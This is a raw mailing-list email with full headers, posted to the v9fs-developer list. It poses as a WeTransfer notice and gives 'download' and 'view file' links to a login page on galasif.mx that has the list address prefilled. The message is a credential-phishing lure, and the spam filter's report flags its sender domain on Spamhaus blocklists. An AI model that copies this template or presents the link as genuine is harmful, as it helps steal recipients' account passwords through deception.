Return-Path: <v9fs-developer-bounces@lists.sourceforge.net>
X-Original-To: lists+v9fs-developer@lfdr.de
Delivered-To: lists+v9fs-developer@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 59DC853B836
	for <lists+v9fs-developer@lfdr.de>; Thu,  2 Jun 2022 13:53:05 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <v9fs-developer-bounces@lists.sourceforge.net>)
	id 1nwjNs-0006rj-Nm; Thu, 02 Jun 2022 11:53:01 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <supportcen@yachenvvood.com>) id 1nwjNr-0006rV-BS
 for v9fs-developer@lists.sourceforge.net; Thu, 02 Jun 2022 11:53:00 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=bVATLZTIIi01d+LHloKFX8Cz3JASMfJbGslw5O346TU=; b=cKQNPrgcYooHFXxqGXz/Atq+/2
 vwZ3nleiQya72l0KSOcWm17s62k8vYVLMDG3aRDjbRB5F0+71iGogUbGq6LaBlkdu2ULTkSu4PLa6
 2s5IQD0M2fiA5tPpIAh6UtbjFIpsWUz9v5+lTCqxK52ZfFTCF3ybVposEVWcEwBeGHR0=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=bVATLZTIIi01d+LHloKFX8Cz3JASMfJbGslw5O346TU=; b=G
 syLNx7ct8JyxfOIgCFz08RqvbDUAR0seHJ5XxxX/jw6KLptLZwsZHJJyvQcqn7AV/JxSPEGEQW0W5
 iulRBi04dNmNMafX/sYGFyLD0qiK5Y1Cu5Gia74bUZ+uSmL3OWVSRjx001hkBSxJME7L7WyGD1PYG
 DCY1I0CrMaNNfQ4E=;
Received: from [212.114.52.118] (helo=mta0.yachenvvood.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
 id 1nwjNr-002AsW-Bb
 for v9fs-developer@lists.sourceforge.net; Thu, 02 Jun 2022 11:52:59 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default;
 d=yachenvvood.com; 
 h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id;
 i=supportcen@yachenvvood.com; bh=SbI3UnWQFNVsgM/xpucYYwOVF6A=;
 b=eJs+ykKFmoWw0visrUcOUSA5ZfS7Shz05CnViSNeq/pJii/QaYpDNXRGUfx3t9ixd82ZIZEDwPaD
 yHpS81+NkS/h+U/0Q9NXbioW3a3ZdT94kNRXYGhTEDi0J49ODaqYCc1QMz6q61BMDIzOlcJNmnLQ
 B5Whq9x13OS1xemBZC4=
To: <v9fs-developer@lists.sourceforge.net>
MIME-Version: 1.0
Date: Thu, 2 Jun 2022 13:45:00 +0200
Message-Id: <2022020613445971318D18DC-3F21E5BD4D@yachenvvood.com>
X-Spam-Score: 7.3 (+++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Hi v9fs-developer Someone sent you some file(s) via
 lists.sourceforge.net Wetransfer. DOWNLOAD FILE HERE
 https://galasif.mx/.Wetrn/login1.php?userid=v9fs-developer@lists.sourceforge.net
 VIEW FILE HERE
 https://galasif.mx/.Wetrn/login1.php?userid=v9fs-developer@lists.sourceforge.net
 Content analysis details:   (7.3 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
 blocklist [URIs: yachenvvood.com]
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [212.114.52.118 listed in zen.spamhaus.org]
 0.1 URIBL_CSS_A Contains URL's A record listed in the Spamhaus CSS
 blocklist [URIs: yachenvvood.com]
 0.1 URIBL_CSS Contains an URL's NS IP listed in the Spamhaus CSS
 blocklist [URIs: yachenvvood.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
X-Headers-End: 1nwjNr-002AsW-Bb
X-Content-Filtered-By: Mailman/MimeDel 2.1.21
Subject: [V9fs-developer] Someone sent you some file(s)
X-BeenThere: v9fs-developer@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <v9fs-developer.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/v9fs-developer>, 
 <mailto:v9fs-developer-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=v9fs-developer>
List-Post: <mailto:v9fs-developer@lists.sourceforge.net>
List-Help: <mailto:v9fs-developer-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/v9fs-developer>, 
 <mailto:v9fs-developer-request@lists.sourceforge.net?subject=subscribe>
From: Wetransfer via V9fs-developer <v9fs-developer@lists.sourceforge.net>
Reply-To: Wetransfer <supportcen@yachenvvood.com>
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable
Errors-To: v9fs-developer-bounces@lists.sourceforge.net


Hi v9fs-developer
Someone sent you some file(s) via lists.sourceforge.net Wetransfer.

DOWNLOAD FILE HERE https://galasif.mx/.Wetrn/login1.php?userid=3Dv9fs-devel=
oper@lists.sourceforge.net

VIEW FILE HERE https://galasif.mx/.Wetrn/login1.php?userid=3Dv9fs-developer=
@lists.sourceforge.net

=A92022 lists.sourceforge.net File Share

_______________________________________________
V9fs-developer mailing list
V9fs-developer@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/v9fs-developer
